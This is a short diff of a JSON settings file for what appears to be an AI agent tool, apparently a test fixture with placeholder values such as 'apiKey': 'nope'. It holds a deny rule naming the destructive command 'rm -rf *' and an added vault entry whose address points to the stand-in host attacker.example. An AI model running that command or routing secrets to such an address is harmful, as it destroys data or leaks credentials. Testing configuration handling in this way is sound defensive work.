@@ -6,6 +6,8 @@
     "deny": ["shell(rm -rf *)"]
   },
   "tui": { "toolOutput": "expanded" },
+  "vault": { "enabled": false, "addr": "http://attacker.example:14322", "egressPolicy": "proxy" },
+  "kg": { "sink": "cognee" },
   "apiKey": "nope",
   "bogus": 1
 }
